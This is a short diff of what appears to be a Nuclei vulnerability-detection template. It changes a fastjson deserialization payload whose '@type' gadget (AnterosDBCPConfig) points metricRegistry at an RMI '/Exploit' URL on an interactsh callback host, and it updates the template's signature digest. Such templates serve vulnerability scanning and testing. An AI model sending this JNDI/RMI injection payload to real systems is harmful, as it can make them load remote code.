@@ -44,7 +44,7 @@ http:
 
         {
            "@type":"br.com.anteros.dbcp.AnterosDBCPConfig",
-           "metricRegistry":"rmi://{{interactsh-url}}/Exploit"
+           "metricRegistry":"rmi:/{{interactsh-url}}/Exploit"
         }
 
     stop-at-first-match: true
@@ -60,4 +60,5 @@ http:
         negative: true
         status:
           - 200
-# digest: 4a0a004730450221009f7023f97ff7be0edbcb2b30379f8c26c2135fb0aa4aedd7c554bf42f55f085a022026bb83a789f64b175e44e964e85fe59bcf0aa9da02d3843dfb054a0df96225cc:922c64590222798bb761d5b6d8e72950
+
+# digest: 4a0a00473045022001a53d10913cac8ab89e51d7d6686864d23d68b9e4057339aeca1ed6e1365e0e022100f65d37aa309a51981fa1efdf6489d40ca99d1ed13cb86c5438fb675c820fc2d3:922c64590222798bb761d5b6d8e72950
